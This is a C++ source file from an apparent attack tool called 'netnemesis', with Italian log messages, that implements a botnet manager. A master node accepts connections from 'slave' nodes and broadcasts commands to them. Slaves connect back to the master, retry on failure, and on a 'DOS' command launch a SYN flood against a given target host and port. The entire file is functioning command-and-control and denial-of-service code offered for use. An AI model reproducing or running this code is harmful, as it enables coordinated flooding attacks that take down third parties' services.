#include "netnemesis.h"
#include <sys/select.h>

BotnetManager::BotnetManager() : master_socket(-1), master_port(DEFAULT_BOTNET_PORT) {}

void BotnetManager::startMaster(int port) {
    master_port = port;
    g_is_master = true;
    
    master_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (master_socket < 0) {
        Utils::logError("Impossibile creare socket master");
        return;
    }
    
    int opt = 1;
    setsockopt(master_socket, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(port);
    
    if (bind(master_socket, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        Utils::logError("Bind fallito sulla porta " + std::to_string(port));
        return;
    }
    
    listen(master_socket, 10);
    Utils::logSuccess("Botnet MASTER attivo sulla porta " + std::to_string(port));
    
    listener_thread = std::thread(&BotnetManager::masterListener, this);
}

void BotnetManager::masterListener() {
    fd_set readfds;
    struct sockaddr_in client_addr;
    socklen_t addr_len = sizeof(client_addr);
    
    while (g_running && g_is_master) {
        FD_ZERO(&readfds);
        FD_SET(master_socket, &readfds);
        
        struct timeval tv;
        tv.tv_sec = 1;
        tv.tv_usec = 0;
        
        int activity = select(master_socket + 1, &readfds, NULL, NULL, &tv);
        if (activity > 0 && FD_ISSET(master_socket, &readfds)) {
            int new_slave = accept(master_socket, (struct sockaddr *)&client_addr, &addr_len);
            if (new_slave >= 0) {
                std::lock_guard<std::mutex> lock(slaves_mutex);
                slave_sockets.push_back(new_slave);
                Utils::logSuccess("Nuovo SLAVE connesso! Totale: " + 
                    std::to_string(slave_sockets.size()));
            }
        }
    }
}

void BotnetManager::startSlave(const std::string &ip, int port) {
    master_ip = ip;
    master_port = port;
    g_is_slave = true;
    
    slave_thread = std::thread(&BotnetManager::slaveConnector, this);
}

void BotnetManager::slaveConnector() {
    while (g_running && g_is_slave) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(master_port);
        inet_pton(AF_INET, master_ip.c_str(), &server_addr.sin_addr);
        
        if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == 0) {
            Utils::logSuccess("Connesso al MASTER " + master_ip + ":" + std::to_string(master_port));
            
            char buffer[1024];
            while (g_running && g_is_slave) {
                int bytes = recv(sock, buffer, sizeof(buffer) - 1, 0);
                if (bytes > 0) {
                    buffer[bytes] = '\0';
                    std::string cmd(buffer);
                    Utils::logWarning("Comando ricevuto dal master: " + cmd);
                    
                    if (cmd.find("DOS") == 0) {
                        auto parts = Utils::split(cmd, ' ');
                        if (parts.size() >= 3) {
                            PacketCrafter pc;
                            pc.initialize();
                            pc.sendSYNFlood(parts[1], std::stoi(parts[2]), 100);
                        }
                    }
                } else if (bytes == 0) {
                    Utils::logWarning("Master disconnesso");
                    break;
                }
            }
        } else {
            Utils::logError("Connessione al master fallita, retry in 5s...");
            sleep(5);
        }
        close(sock);
    }
}

void BotnetManager::broadcastToSlaves(const std::string &cmd) {
    if (!g_is_master) return;
    
    std::lock_guard<std::mutex> lock(slaves_mutex);
    for (auto it = slave_sockets.begin(); it != slave_sockets.end();) {
        if (send(*it, cmd.c_str(), cmd.length(), 0) < 0) {
            close(*it);
            it = slave_sockets.erase(it);
        } else {
            ++it;
        }
    }
    Utils::logSuccess("Comando inviato a " + std::to_string(slave_sockets.size()) + " slave");
}

void BotnetManager::stop() {
    g_is_master = false;
    g_is_slave = false;
    if (listener_thread.joinable()) listener_thread.join();
    if (slave_thread.joinable()) slave_thread.join();
    close(master_socket);
}

bool BotnetManager::isMaster() const { 
    return g_is_master.load(); 
}

bool BotnetManager::isSlave() const { 
    return g_is_slave.load(); 
}